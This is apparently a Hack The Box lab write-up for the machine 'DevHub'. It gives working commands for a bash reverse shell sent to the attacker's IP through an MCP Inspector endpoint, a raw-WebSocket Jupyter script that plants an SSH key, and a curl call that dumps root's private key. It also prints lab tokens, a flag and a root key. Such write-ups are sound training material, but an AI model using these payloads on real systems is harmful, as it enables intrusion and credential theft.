# DevHub

### Platform: Hack The Box
### Difficulty: Medium
### OS: Linux (Ubuntu 22.04)
### Target IP: 10.129.3.57
### Attacker IP: 10.10.15.65
### Date: 13.6.2026     

---
# Summary
### Initial access came from an RCE in MCP Inspector. Then Jupyter Lab was abused to access the analyst account, and a hidden admin endpoint allowed privilege escalation to root.

---

# Reconnaissance

## Port Scan


```bash
nmap -p- -sC -sV 10.129.3.57 -oA 10.129.3.57
```

### Scan Result

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 15:08 +0800
Nmap scan report for 10.129.3.57
Host is up (0.032s latency).

Not shown: 65532 filtered tcp ports (no-response)

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)

80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)

6274/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sat, 13 Jun 2026 07:13:24 GMT
|_    Connection: close
```
| Port | State | Service | Version | 
| ----------- | ----------- | ----------- | ----------- |
| 22/tcp | open | ssh | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
| 80/tcp | open | http | nginx 1.18.0 (Ubuntu) |
| 6274/tcp | open | unknown | unknown |

---
## Environment Setup

The web application redirects users to the local domain `devhub.htb`. To access the site correctly, add the domain to the local hosts file.

```bash
echo "10.129.3.57 devhub.htb" | sudo tee -a /etc/hosts 
```
![alt text](<Screenshot 2026-06-13 155619.png>)

---

# Foothold

## Reverse Shell via MCP Inspector

Port 6274 hosts an MCP Inspector service. The `/api/mcp/connect` endpoint accepts user-controlled commands, allowing remote command execution.

### Start a Netcat Listener

```bash
nc -lvnp 4444
```
### Trigger Reverse Shell

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/10.10.15.65/4444 0>&1"], "env": {}}, "serverId": "shell3"}'
```

![alt text](<HTB/Screenshot/Screenshot 2026-06-13 155932.png>)

A reverse shell connection is received as the `mcp-dev` user.

![alt text](<HTB/Screenshot/Screenshot 2026-06-13 155259.png>)

### Upgrade TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


![alt text](<HTB/Screenshot/Screenshot 2026-06-13 160027.png>)

# Lateral Movement

## Discover Internal Jupyter Service

Enumerate running processes and identify an internal Jupyter Lab instance.

```bash
ps aux | grep jupyter
```

The process arguments reveal a valid authentication token.

![alt text](<HTB/Screenshot/Screenshot 2026-06-13 160124.png>)
#### Token: `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`

### Create a New Kernel

```bash
curl -s -X POST \
"http://localhost:8888/api/kernels?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
-H "Content-Type: application/json" \
-d '{}'
```

The request returns a kernel ID which can be used for code execution.

![alt text](<HTB/Screenshot/Screenshot 2026-06-13 160341.png>)
#### Kernel ID: `efeaea2d-c81e-4991-afb5-66c9af19fe72`

### Raw WebSocket

Since websocket-client was unavailable (no internet), a raw WebSocket frame was crafted manually

```python
python3 << 'EOF'
import socket, base64, os, json, struct, uuid, time

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "efeaea2d-c81e-4991-afb5-66c9af19fe72"
key = base64.b64encode(os.urandom(16)).decode()

upgrade = (
    f"GET /api/kernels/{KERNEL_ID}/channels?token={TOKEN} HTTP/1.1\r\n"
    f"Host: localhost:8888\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
)

s = socket.socket()
s.connect(("localhost", 8888))
s.send(upgrade.encode())
s.recv(4096)

cmd = "import os; os.system('mkdir -p /home/analyst/.ssh && echo \"ssh-rsa AAAAB3NzaC1yc2E... chin@kali\" >> /home/analyst/.ssh/authorized_keys && chmod 700 /home/analyst/.ssh && chmod 600 /home/analyst/.ssh/authorized_keys')"

msg = json.dumps({
    "header": {
        "msg_id": str(uuid.uuid4()),
        "msg_type": "execute_request",
        "username": "",
        "session": str(uuid.uuid4()),
        "version": "5.0"
    },
    "parent_header": {},
    "metadata": {},
    "content": {
        "code": cmd,
        "silent": False
    }
})

payload = msg.encode()
length = len(payload)
mask_key = os.urandom(4)
masked = bytearray([payload[i] ^ mask_key[i % 4] for i in range(length)])

if length <= 125:
    header = struct.pack('!BB', 0x81, 0x80 | length) + mask_key
elif length <= 65535:
    header = struct.pack('!BBH', 0x81, 0xFE, length) + mask_key
else:
    header = struct.pack('!BBQ', 0x81, 0xFF, length) + mask_key

s.send(header + masked)
time.sleep(2)

print("[+] SSH Key Injection payload dispatched!")
```

### Execute WebSocket Exploit

Transfer and execute the Python script to inject an SSH public key into the analyst user's account.

```bash
python3 /tmp/pwn.py
```

### SSH as analyst

```bash
ssh analyst@devhub.htb
```

Successful login confirms access to the analyst account.

![alt text](<HTB/Screenshot/Screenshot 2026-06-13 160843.png>)

### User Flag

```bash
cat ~/user.txt
```

![alt text](<HTB/Screenshot/Screenshot 2026-06-13 161549.png>)
#### User Flag: `9cfd5dc906d5b588b7859424e6e0421a`

# Privilege Escalation

## Review Internal Service

During enumeration, an internal Flask application is discovered.

```bash
cat /opt/opsmcp/server.py
```

Reviewing the source code reveals:

- A hardcoded API key
- A hidden administrative function named `ops._admin_dump`

![alt text](<HTB/Screenshot/Screenshot 2026-06-13 162328.png>)

### Dump Root SSH Key

```bash
curl -s -X POST "http://localhost:5000/tools/call" \
-H "Content-Type: application/json" \
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

The endpoint returns the root user's private SSH key.
![alt text](<HTB/Screenshot/Screenshot 2026-06-13 162753.png>)
#### Key: `nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=`

### SSH as root

Save the key locally and set the correct permissions.

```bash
chmod 600 root_key
ssh -i root_key root@10.129.3.57
```

A root shell is obtained.
